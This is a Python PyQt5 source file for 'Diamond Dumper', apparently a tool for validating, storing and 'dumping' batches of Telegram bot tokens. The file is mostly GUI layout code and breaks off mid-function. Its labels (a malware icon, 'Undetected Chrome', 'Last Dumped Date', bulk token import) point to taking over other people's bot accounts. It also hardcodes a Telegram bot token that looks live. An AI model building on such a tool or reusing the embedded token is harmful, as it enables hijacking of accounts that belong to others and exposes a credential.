import requests
import sys
import os
from PyQt5 import QtCore, QtGui, QtWidgets
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from telethon import TelegramClient
from PyQt5.QtWidgets import QTableWidget
from PyQt5.QtWidgets import QApplication, QLineEdit, QHBoxLayout, QShortcut, QMainWindow, QListWidget, QDockWidget, QPlainTextEdit, QLCDNumber, QWidget, QVBoxLayout, QTextBrowser, QFileDialog, QTextEdit, QComboBox, QPushButton, QMessageBox, QFrame, QInputDialog, QLabel, QCheckBox, QScrollBar, QDialogButtonBox, QDialog, QGridLayout, QMenu, QAction, QTabBar, QHeaderView
import sqlite3
from PyQt5.QtWidgets import QFileDialog, QDialog, QMessageBox, QPushButton
from PyQt5.QtGui import QDesktopServices
from PyQt5.QtCore import QUrl, Qt
import datetime
import traceback





# Replace with your bot token
bot_token = '7157418160:AAEA0ul4BXFFkCUdNbMgNKlGCRw-04kXujE'
# Initialize bot and dispatcher
bot = Bot(token=bot_token)  # Corrected line to set bot token
dp = Dispatcher(bot, storage=MemoryStorage())



class Ui_DiamondDumper(object):
    def setupUi(self, DiamondDumper):
        DiamondDumper.setObjectName("DiamondDumper")
        DiamondDumper.resize(980, 687)
        DiamondDumper.setMinimumSize(QtCore.QSize(980, 500))
        DiamondDumper.setMaximumSize(QtCore.QSize(980, 875))
        palette = QtGui.QPalette()
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.HighlightedText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255, 128))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.PlaceholderText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.HighlightedText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255, 128))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.PlaceholderText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(35, 38, 41))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 255, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.HighlightedText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255, 128))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.PlaceholderText, brush)
        DiamondDumper.setPalette(palette)
        font = QtGui.QFont()
        font.setBold(False)
        DiamondDumper.setFont(font)
        DiamondDumper.setAutoFillBackground(False)
        DiamondDumper.setStyleSheet("QLineEdit,\n"
"QComboBox,\n"
"QDateTimeEdit,\n"
"QSpinBox,\n"
"QDoubleSpinBox {\n"
"  color: #1de9b6;\n"
"  background-color: #31363b;\n"
"  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;\n"
"}\n"
"\n"
"QWidget {\n"
"  background-color: #232629;\n"
"  color: #ffffff;\n"
"}\n"
"\n"
"QGroupBox,\n"
"QFrame {\n"
"  background-color: #232629;\n"
"  border: 2px solid #4f5b62;\n"
"  border-radius: 4px;\n"
"}\n"
"\n"
"QRadioButton::indicator,\n"
"QCheckBox::indicator {\n"
"  width: 16px;\n"
"  height: 16px;\n"
"  border: 2px solid #1de9b6;\n"
"  border-radius: 0;\n"
"  transform: rotate(45deg);\n"
"  transform-origin: center;\n"
"}\n"
"\n"
"QRadioButton::indicator:checked,\n"
"QCheckBox::indicator:checked {\n"
"  background-color: #1de9b6;\n"
"  border-color: #1de9b6;\n"
"}\n"
"\n"
"QRadioButton::indicator:hover,\n"
"QCheckBox::indicator:hover {\n"
"  border-color: rgba(29, 233, 182, 0.8);\n"
"}\n"
"\n"
"QRadioButton::indicator:checked:hover,\n"
"QCheckBox::indicator:checked:hover {\n"
"  border-color: #1de9b6;\n"
"}")
        DiamondDumper.setAnimated(True)
        self.centralwidget = QtWidgets.QWidget(DiamondDumper)
        self.centralwidget.setWhatsThis("")
        self.centralwidget.setObjectName("centralwidget")
        self.tableWidget = QtWidgets.QTableWidget(self.centralwidget)
        self.tableWidget.setGeometry(QtCore.QRect(10, 100, 951, 221))
        self.tableWidget.setStyleSheet("border-color: #1de9b6;\n"
"color: rgb(222, 0, 0);")
        self.tableWidget.setObjectName("tableWidget")
        self.tableWidget.setColumnCount(7)
        self.tableWidget.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(3, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(4, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(5, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(6, item)
        self.submit_single_token_button = QtWidgets.QPushButton(self.centralwidget)
        self.submit_single_token_button.setGeometry(QtCore.QRect(240, 10, 80, 31))
        self.submit_single_token_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.submit_single_token_button.setObjectName("submit_single_token_button")
        self.sync_button = QtWidgets.QPushButton(self.centralwidget)
        self.sync_button.setGeometry(QtCore.QRect(380, 60, 51, 31))
        font = QtGui.QFont()
        font.setPointSize(11)
        self.sync_button.setFont(font)
        self.sync_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.sync_button.setObjectName("sync_button")
        self.import_bulk_button = QtWidgets.QPushButton(self.centralwidget)
        self.import_bulk_button.setGeometry(QtCore.QRect(500, 10, 80, 31))
        self.import_bulk_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.import_bulk_button.setObjectName("import_bulk_button")
        self.bot_manager_text_input = QtWidgets.QTextEdit(self.centralwidget)
        self.bot_manager_text_input.setGeometry(QtCore.QRect(10, 60, 221, 31))
        self.bot_manager_text_input.setStyleSheet("  border-color: #1de9b6;")
        self.bot_manager_text_input.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.bot_manager_text_input.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.bot_manager_text_input.setLineWrapMode(QtWidgets.QTextEdit.NoWrap)
        self.bot_manager_text_input.setObjectName("bot_manager_text_input")
        self.single_token_submittion_text_input = QtWidgets.QTextEdit(self.centralwidget)
        self.single_token_submittion_text_input.setGeometry(QtCore.QRect(10, 10, 221, 31))
        self.single_token_submittion_text_input.setStyleSheet("  border-color: #1de9b6;")
        self.single_token_submittion_text_input.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.single_token_submittion_text_input.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.single_token_submittion_text_input.setLineWrapMode(QtWidgets.QTextEdit.NoWrap)
        self.single_token_submittion_text_input.setObjectName("single_token_submittion_text_input")
        self.telegram_chat_id_text_input = QtWidgets.QTextEdit(self.centralwidget)
        self.telegram_chat_id_text_input.setGeometry(QtCore.QRect(240, 60, 131, 31))
        self.telegram_chat_id_text_input.setStyleSheet("  border-color: #1de9b6;")
        self.telegram_chat_id_text_input.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.telegram_chat_id_text_input.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.telegram_chat_id_text_input.setLineWrapMode(QtWidgets.QTextEdit.NoWrap)
        self.telegram_chat_id_text_input.setObjectName("telegram_chat_id_text_input")
        self.import_bulk_file_path_text_edit = QtWidgets.QTextEdit(self.centralwidget)
        self.import_bulk_file_path_text_edit.setGeometry(QtCore.QRect(330, 10, 161, 31))
        self.import_bulk_file_path_text_edit.setStyleSheet("  border-color: #1de9b6;")
        self.import_bulk_file_path_text_edit.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.import_bulk_file_path_text_edit.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.import_bulk_file_path_text_edit.setLineWrapMode(QtWidgets.QTextEdit.NoWrap)
        self.import_bulk_file_path_text_edit.setObjectName("import_bulk_file_path_text_edit")
        self.sub_console_frame = QtWidgets.QFrame(self.centralwidget)
        self.sub_console_frame.setGeometry(QtCore.QRect(610, 0, 351, 91))
        self.sub_console_frame.setStyleSheet("  border-color: #1de9b6;")
        self.sub_console_frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.sub_console_frame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.sub_console_frame.setObjectName("sub_console_frame")
        self.sub_console_frame_text = QtWidgets.QTextEdit(self.sub_console_frame)
        self.sub_console_frame_text.setGeometry(QtCore.QRect(0, 0, 351, 91))
        self.sub_console_frame_text.setObjectName("sub_console_frame_text")
        self.main_console_frame = QtWidgets.QFrame(self.centralwidget)
        self.main_console_frame.setGeometry(QtCore.QRect(210, 330, 581, 261))
        self.main_console_frame.setStyleSheet("  border-color: #1de9b6;")
        self.main_console_frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.main_console_frame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.main_console_frame.setObjectName("main_console_frame")
        self.console_text_edit = QtWidgets.QTextEdit(self.main_console_frame)
        self.console_text_edit.setGeometry(QtCore.QRect(0, 0, 581, 261))
        self.console_text_edit.setObjectName("console_text_edit")
        self.start_button = QtWidgets.QPushButton(self.centralwidget)
        self.start_button.setGeometry(QtCore.QRect(10, 370, 80, 31))
        self.start_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.start_button.setObjectName("start_button")
        self.stop_button = QtWidgets.QPushButton(self.centralwidget)
        self.stop_button.setGeometry(QtCore.QRect(100, 370, 80, 31))
        self.stop_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.stop_button.setObjectName("stop_button")
        self.setWebhook_button = QtWidgets.QPushButton(self.centralwidget)
        self.setWebhook_button.setGeometry(QtCore.QRect(800, 343, 80, 31))
        self.setWebhook_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.setWebhook_button.setObjectName("setWebhook_button")
        self.sendDocument_button = QtWidgets.QPushButton(self.centralwidget)
        self.sendDocument_button.setGeometry(QtCore.QRect(890, 343, 80, 31))
        self.sendDocument_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.sendDocument_button.setObjectName("sendDocument_button")
        self.getME_button = QtWidgets.QPushButton(self.centralwidget)
        self.getME_button.setGeometry(QtCore.QRect(800, 380, 80, 31))
        self.getME_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.getME_button.setObjectName("getME_button")
        self.sendPhoto_button = QtWidgets.QPushButton(self.centralwidget)
        self.sendPhoto_button.setGeometry(QtCore.QRect(890, 380, 80, 31))
        self.sendPhoto_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.sendPhoto_button.setObjectName("sendPhoto_button")
        self.sendMessage_button = QtWidgets.QPushButton(self.centralwidget)
        self.sendMessage_button.setGeometry(QtCore.QRect(800, 430, 80, 31))
        self.sendMessage_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.sendMessage_button.setObjectName("sendMessage_button")
        self.set_privacy_button = QtWidgets.QPushButton(self.centralwidget)
        self.set_privacy_button.setGeometry(QtCore.QRect(890, 430, 80, 31))
        self.set_privacy_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.set_privacy_button.setObjectName("set_privacy_button")
        self.pushButton_7 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_7.setGeometry(QtCore.QRect(800, 470, 80, 31))
        self.pushButton_7.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.pushButton_7.setObjectName("pushButton_7")
        self.pushButton_8 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_8.setGeometry(QtCore.QRect(890, 470, 80, 31))
        self.pushButton_8.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.pushButton_8.setObjectName("pushButton_8")
        self.console_text_response_input = QtWidgets.QTextEdit(self.centralwidget)
        self.console_text_response_input.setGeometry(QtCore.QRect(220, 600, 471, 31))
        self.console_text_response_input.setObjectName("console_text_response_input")
        self.console_text_response_button = QtWidgets.QPushButton(self.centralwidget)
        self.console_text_response_button.setGeometry(QtCore.QRect(700, 600, 80, 31))
        self.console_text_response_button.setStyleSheet("  border: 2px solid #1de9b6;\n"
"  border-radius: 4px;\n"
"  height: 32px;")
        self.console_text_response_button.setObjectName("console_text_response_button")
        DiamondDumper.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(DiamondDumper)
        self.statusbar.setObjectName("statusbar")
        DiamondDumper.setStatusBar(self.statusbar)
        self.menubar = QtWidgets.QMenuBar(DiamondDumper)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 980, 22))
        self.menubar.setObjectName("menubar")
        self.menuDiamond_Sorter = QtWidgets.QMenu(self.menubar)
        self.menuDiamond_Sorter.setObjectName("menuDiamond_Sorter")
        self.menuConsole_Screen = QtWidgets.QMenu(self.menubar)
        self.menuConsole_Screen.setObjectName("menuConsole_Screen")
        self.menuSettings = QtWidgets.QMenu(self.menubar)
        self.menuSettings.setObjectName("menuSettings")
        self.menuBrowser = QtWidgets.QMenu(self.menubar)
        self.menuBrowser.setObjectName("menuBrowser")
        self.menuAbout = QtWidgets.QMenu(self.menubar)
        self.menuAbout.setGeometry(QtCore.QRect(661, 101, 144, 156))
        self.menuAbout.setAccessibleName("")
        self.menuAbout.setTearOffEnabled(False)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("icons/malware-64.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.menuAbout.setIcon(icon)
        self.menuAbout.setSeparatorsCollapsible(False)
        self.menuAbout.setToolTipsVisible(False)
        self.menuAbout.setObjectName("menuAbout")
        DiamondDumper.setMenuBar(self.menubar)
        self.actionaboutButton = QtWidgets.QAction(DiamondDumper)
        self.actionaboutButton.setMenuRole(QtWidgets.QAction.AboutRole)
        self.actionaboutButton.setObjectName("actionaboutButton")
        self.windows_menu_actionDiamondPad = QtWidgets.QAction(DiamondDumper)
        self.windows_menu_actionDiamondPad.setObjectName("windows_menu_actionDiamondPad")
        self.window_menu_actionPrefrences = QtWidgets.QAction(DiamondDumper)
        self.window_menu_actionPrefrences.setObjectName("window_menu_actionPrefrences")
        self.window_menu_actionRegex = QtWidgets.QAction(DiamondDumper)
        self.window_menu_actionRegex.setObjectName("window_menu_actionRegex")
        self.actionRegex_Cheat_Sheet = QtWidgets.QAction(DiamondDumper)
        self.actionRegex_Cheat_Sheet.setObjectName("actionRegex_Cheat_Sheet")
        self.actionHints_Tricks = QtWidgets.QAction(DiamondDumper)
        self.actionHints_Tricks.setObjectName("actionHints_Tricks")
        self.actionDataParsing = QtWidgets.QAction(DiamondDumper)
        self.actionDataParsing.setObjectName("actionDataParsing")
        self.actionDisplay_Console = QtWidgets.QAction(DiamondDumper)
        self.actionDisplay_Console.setObjectName("actionDisplay_Console")
        self.actionDisplay_HTTP_Client = QtWidgets.QAction(DiamondDumper)
        self.actionDisplay_HTTP_Client.setObjectName("actionDisplay_HTTP_Client")
        self.actionEnable_Everything = QtWidgets.QAction(DiamondDumper)
        self.actionEnable_Everything.setObjectName("actionEnable_Everything")
        self.actionLaunch_Browser = QtWidgets.QAction(DiamondDumper)
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap("icons/diamond.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.actionLaunch_Browser.setIcon(icon1)
        self.actionLaunch_Browser.setVisible(True)
        self.actionLaunch_Browser.setObjectName("actionLaunch_Browser")
        self.actionUndetected_Chrome = QtWidgets.QAction(DiamondDumper)
        self.actionUndetected_Chrome.setObjectName("actionUndetected_Chrome")
        self.actionShow_Widget_Functions = QtWidgets.QAction(DiamondDumper)
        self.actionShow_Widget_Functions.setObjectName("actionShow_Widget_Functions")
        self.actionInsomnia_HTTP_Client = QtWidgets.QAction(DiamondDumper)
        self.actionInsomnia_HTTP_Client.setObjectName("actionInsomnia_HTTP_Client")
        self.actionloadDirectory = QtWidgets.QAction(DiamondDumper)
        icon = QtGui.QIcon.fromTheme("accessories-text-editor")
        self.actionloadDirectory.setIcon(icon)
        self.actionloadDirectory.setMenuRole(QtWidgets.QAction.ApplicationSpecificRole)
        self.actionloadDirectory.setObjectName("actionloadDirectory")
        self.actionMembership = QtWidgets.QAction(DiamondDumper)
        self.actionMembership.setObjectName("actionMembership")
        self.actionTelegram_Group = QtWidgets.QAction(DiamondDumper)
        self.actionTelegram_Group.setObjectName("actionTelegram_Group")
        self.actionMentorship = QtWidgets.QAction(DiamondDumper)
        self.actionMentorship.setObjectName("actionMentorship")
        self.actionHomepage = QtWidgets.QAction(DiamondDumper)
        self.actionHomepage.setObjectName("actionHomepage")
        self.menuDiamond_Sorter.addAction(self.windows_menu_actionDiamondPad)
        self.menuDiamond_Sorter.addAction(self.window_menu_actionPrefrences)
        self.menuDiamond_Sorter.addAction(self.window_menu_actionRegex)
        self.menuDiamond_Sorter.addSeparator()
        self.menuDiamond_Sorter.addAction(self.actionShow_Widget_Functions)
        self.menuConsole_Screen.addAction(self.actionDisplay_Console)
        self.menuConsole_Screen.addSeparator()
        self.menuConsole_Screen.addAction(self.actionEnable_Everything)
        self.menuConsole_Screen.addSeparator()
        self.menuSettings.addAction(self.actionRegex_Cheat_Sheet)
        self.menuSettings.addAction(self.actionHints_Tricks)
        self.menuSettings.addAction(self.actionDataParsing)
        self.menuBrowser.addAction(self.actionLaunch_Browser)
        self.menuBrowser.addAction(self.actionUndetected_Chrome)
        self.menuBrowser.addSeparator()
        self.menuBrowser.addAction(self.actionInsomnia_HTTP_Client)
        self.menuAbout.addAction(self.actionHomepage)
        self.menuAbout.addSeparator()
        self.menuAbout.addAction(self.actionMembership)
        self.menuAbout.addAction(self.actionMentorship)
        self.menuAbout.addSeparator()
        self.menuAbout.addAction(self.actionTelegram_Group)
        self.menubar.addAction(self.menuDiamond_Sorter.menuAction())
        self.menubar.addAction(self.menuConsole_Screen.menuAction())
        self.menubar.addAction(self.menuBrowser.menuAction())
        self.menubar.addAction(self.menuSettings.menuAction())
        self.menubar.addAction(self.menuAbout.menuAction())

        self.retranslateUi(DiamondDumper)
        QtCore.QMetaObject.connectSlotsByName(DiamondDumper)

    def retranslateUi(self, DiamondDumper):
        _translate = QtCore.QCoreApplication.translate
        DiamondDumper.setWindowTitle(_translate("DiamondDumper", "DiamondSorter"))
        item = self.tableWidget.horizontalHeaderItem(0)
        item.setText(_translate("DiamondDumper", "No."))
        item = self.tableWidget.horizontalHeaderItem(1)
        item.setText(_translate("DiamondDumper", "Token"))
        item = self.tableWidget.horizontalHeaderItem(2)
        item.setText(_translate("DiamondDumper", "Bot Name"))
        item = self.tableWidget.horizontalHeaderItem(3)
        item.setText(_translate("DiamondDumper", "Status"))
        item = self.tableWidget.horizontalHeaderItem(4)
        item.setText(_translate("DiamondDumper", "Submission Date"))
        item = self.tableWidget.horizontalHeaderItem(5)
        item.setText(_translate("DiamondDumper", "Last Checked Date"))
        item = self.tableWidget.horizontalHeaderItem(6)
        item.setText(_translate("DiamondDumper", "Last Dumped Date"))
        self.submit_single_token_button.setText(_translate("DiamondDumper", "Submit"))
        self.sync_button.setText(_translate("DiamondDumper", "Sync"))
        self.import_bulk_button.setText(_translate("DiamondDumper", "Import Bulk"))
        self.bot_manager_text_input.setWhatsThis(_translate("DiamondDumper", "Bot Manager Token ID will be the bot that communicates with you from this panel."))
        self.bot_manager_text_input.setPlaceholderText(_translate("DiamondDumper", "Bot Manager Token ID"))
        self.single_token_submittion_text_input.setPlaceholderText(_translate("DiamondDumper", "Single Token Submission"))
        self.telegram_chat_id_text_input.setWhatsThis(_translate("DiamondDumper", "This is that channel or chat ID that you want your Bot Manager to be posting in.\n"
"If you want it set to just you - then set your user ID from @getID bot"))
        self.telegram_chat_id_text_input.setPlaceholderText(_translate("DiamondDumper", "Telegram Chat ID"))
        self.import_bulk_file_path_text_edit.setPlaceholderText(_translate("DiamondDumper", "Text File Path with Tokens"))
        self.start_button.setText(_translate("DiamondDumper", "Start"))
        self.stop_button.setText(_translate("DiamondDumper", "Stop"))
        self.setWebhook_button.setText(_translate("DiamondDumper", "Set Webhook"))
        self.sendDocument_button.setText(_translate("DiamondDumper", "Send Docs"))
        self.getME_button.setText(_translate("DiamondDumper", "Get Me"))
        self.sendPhoto_button.setText(_translate("DiamondDumper", "Send Photo"))
        self.sendMessage_button.setText(_translate("DiamondDumper", "Send Msgs"))
        self.set_privacy_button.setText(_translate("DiamondDumper", "Set Privacy"))
        self.pushButton_7.setText(_translate("DiamondDumper", "PushButton"))
        self.pushButton_8.setText(_translate("DiamondDumper", "PushButton"))
        self.console_text_response_button.setText(_translate("DiamondDumper", "Send"))
        self.menuDiamond_Sorter.setTitle(_translate("DiamondDumper", "Diamond Dumper - Telegram Bot Token Manager"))
        self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
        self.menuSettings.setTitle(_translate("DiamondDumper", "Settings"))
        self.menuBrowser.setTitle(_translate("DiamondDumper", "Browser"))
        self.menuAbout.setTitle(_translate("DiamondDumper", "About"))
        self.actionaboutButton.setText(_translate("DiamondDumper", "aboutButton"))
        self.windows_menu_actionDiamondPad.setText(_translate("DiamondDumper", "Diamond Pad (Coming Soon)"))
        self.window_menu_actionPrefrences.setText(_translate("DiamondDumper", "Regex Creator (Coming Soon)"))
        self.window_menu_actionRegex.setText(_translate("DiamondDumper", "Expression Veiwer (Coming Soon)"))
        self.actionRegex_Cheat_Sheet.setText(_translate("DiamondDumper", "Regex Cheat Sheet"))
        self.actionHints_Tricks.setText(_translate("DiamondDumper", "Hints & Tricks"))
        self.actionDataParsing.setText(_translate("DiamondDumper", "DataParsing"))
        self.actionDisplay_Console.setText(_translate("DiamondDumper", "Display Console (Coming Soon)"))
        self.actionDisplay_HTTP_Client.setText(_translate("DiamondDumper", "Display HTTP Client"))
        self.actionEnable_Everything.setText(_translate("DiamondDumper", "Enable \"Everything\"(Coming Soon)"))
        self.actionLaunch_Browser.setText(_translate("DiamondDumper", "Launch Browser"))
        self.actionUndetected_Chrome.setText(_translate("DiamondDumper", "Undetected Chrome"))
        self.actionShow_Widget_Functions.setText(_translate("DiamondDumper", "Show Widget Functions (Coming Soon)"))
        self.actionInsomnia_HTTP_Client.setText(_translate("DiamondDumper", "Insomnia HTTP Client"))
        self.actionloadDirectory.setText(_translate("DiamondDumper", "loadDirectory"))
        self.actionMembership.setText(_translate("DiamondDumper", "Membership"))
        self.actionTelegram_Group.setText(_translate("DiamondDumper", "Telegram Group"))
        self.actionMentorship.setText(_translate("DiamondDumper", "Mentorship"))
        self.actionHomepage.setText(_translate("DiamondDumper", "Homepage"))


        self.start_button.clicked.connect(start_button_clicked)
        self.stop_button.clicked.connect(stop_button_clicked)
        self.setWebhook_button.clicked.connect(setWebhook_button_clicked)
        self.sendDocument_button.clicked.connect(sendDocument_button_clicked)
        self.getME_button.clicked.connect(getME_button_clicked)
        self.sendPhoto_button.clicked.connect(sendPhoto_button_clicked)
        self.sendMessage_button.clicked.connect(sendMessage_button_clicked)
        self.set_privacy_button.clicked.connect(set_privacy_button_clicked)
        self.pushButton_7.clicked.connect(pushButton_7_clicked)
        self.pushButton_8.clicked.connect(pushButton_8_clicked)
        self.console_text_response_button.clicked.connect(send_response_console)
        self.sync_button.clicked.connect(sync_button_clicked)
        self.import_bulk_button.clicked.connect(import_bulk_tokens)
        self.submit_single_token_button.clicked.connect(self.submit_token_to_database)

    def submit_token_to_database(self):
        token = self.single_token_submittion_text_input.toPlainText()
        if token:
            response = requests.get(f"https://api.telegram.org/bot{token}/getMe")
            if response.status_code == 200:
                data = response.json()
                bot_id = data['result']['id']
                bot_username = data['result']['username']
                bot_link = f"https://t.me/{bot_username}"
    
                info_message = f"Bot ID: {bot_id}\n\n" \
                            f"Bot Username: {bot_username}\n\n" \
                            f"Bot Link: {bot_link}"
    
                msg_box = QMessageBox()
                msg_box.setWindowTitle("Success")
                msg_box.setText(info_message)
                msg_box.setStandardButtons(QMessageBox.Save | QMessageBox.Close)
                msg_box.setDefaultButton(QMessageBox.Close)
                save_button = msg_box.button(QMessageBox.Save)
                save_button.clicked.connect(lambda: self.save_to_table(bot_id, bot_username, bot_link))
                
                clickable_link = f"<a href='{bot_link}'>{bot_link}</a>"
                msg_box.setTextInteractionFlags(msg_box.textInteractionFlags() | Qt.TextBrowserInteraction)
                msg_box.setText(clickable_link)
                
                msg_box.exec_()
            else:
                QMessageBox.critical(None, "Error", "Invalid token.")
        else:
            QMessageBox.critical(None, "Error", "Please enter a token.")
    
    def save_to_table(self, bot_id, bot_username, bot_link):
        # Additional data values
        status = "Active"  # Replace with the actual status value
        submission_date = datetime.date.today().strftime("%Y-%m-%d")
        last_checked_date = ""  # Replace with the actual last checked date value
        last_dumped_date = ""  # Replace with the actual last dumped date value
    
        # Establish a connection to the database
        conn = sqlite3.connect('database.db')
